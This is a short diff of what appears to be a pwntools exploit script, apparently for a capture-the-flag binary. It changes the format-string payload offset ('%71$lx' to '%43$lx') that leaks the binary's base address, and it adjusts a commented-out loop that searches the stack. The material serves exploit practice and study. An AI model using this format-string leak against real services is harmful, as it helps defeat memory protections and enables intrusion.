@@ -60,7 +60,7 @@ continue
 
 # calculating where the stack vars are
 #parts = []
-#for i in range(60, 100, 10):
+#for i in range(10, 70, 10):
 #    io = start()
 #    
 #    # the return address of main is the 7th stack var
@@ -83,11 +83,11 @@ continue
 
 io = start()
 
-# main is @ stack var 71 (and 80 for whatever reason)
+# main is @ stack var 43
 io.info("Leaking base address of the binary.")
 io.recvuntil(b"something: ")
 
-payload = "%71$lx"
+payload = "%43$lx"
 io.sendline(payload.encode('ascii'))
 
 io.recvuntil(b"said:")
